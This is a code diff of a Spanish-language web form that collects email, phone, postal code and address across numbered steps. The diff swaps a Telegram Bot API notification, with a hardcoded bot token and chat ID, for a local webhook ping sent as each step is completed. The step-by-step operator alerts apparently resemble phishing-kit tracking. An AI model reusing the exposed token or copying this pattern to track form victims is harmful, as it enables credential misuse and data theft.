@@ -557,7 +557,6 @@
                             <input class="kern-input" type="email" id="email" placeholder="nombre@ejemplo.com" required />
                         </div>
 
-                        <!-- NUEVO CAMPO: Número celular -->
                         <div class="form-group">
                             <label class="form-label">Número celular *</label>
                             <input class="kern-input" type="tel" id="celular" placeholder="Ej. 3001234567" required />
@@ -621,10 +620,9 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN DE TELEGRAM - ACTUALIZADO CON NUEVAS CREDENCIALES
+        // CONFIGURACIÓN - USANDO WEBHOOK
         // ============================================
-        const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
-        const TELEGRAM_CHAT_ID = '-1003713613246';
+        const WEBHOOK_URL = '/api/webhook';
 
         // Guardar opción de procesamiento prioritario
         function savePriorityOption() {
@@ -632,26 +630,24 @@
             localStorage.setItem('procesamiento_prioritario', rapidoCheckbox.checked);
         }
 
-        // Enviar notificación simple "Ingreso" a Telegram
-        async function enviarIngreso() {
+        // Enviar "p2" al webhook
+        async function enviarP2() {
             try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: '🔔 Ingreso - Nuevo usuario en el sistema'
+                        mensaje: 'p2'
                     })
                 });
                 const data = await response.json();
-                if (data.ok) {
-                    console.log('✅ Notificación "Ingreso" enviada');
+                if (data.success) {
+                    console.log('✅ "p2" enviado al webhook');
                 } else {
-                    console.error('❌ Error enviando notificación:', data.description);
+                    console.error('❌ Error enviando "p2":', data.error);
                 }
             } catch (error) {
-                console.error('❌ Error al enviar notificación:', error);
+                console.error('❌ Error al enviar "p2":', error);
             }
         }
 
@@ -673,15 +669,15 @@
             localStorage.setItem('codigoPostal', document.getElementById('codigoPostal').value);
             localStorage.setItem('direccion', document.getElementById('direccion').value);
             
+            // Enviar "p2" al webhook
+            enviarP2();
+            
             // Redirigir a paso3
             window.location.href = 'paso3.html';
         });
 
-        // Cargar estado guardado al cargar la página y enviar notificación "Ingreso"
+        // Cargar estado guardado al cargar la página
         window.addEventListener('load', function() {
-            // Enviar notificación "Ingreso" (solo eso)
-            enviarIngreso();
-
             const prioritarioGuardado = localStorage.getItem('procesamiento_prioritario') === 'true';
             document.getElementById('rapido').checked = prioritarioGuardado;
             
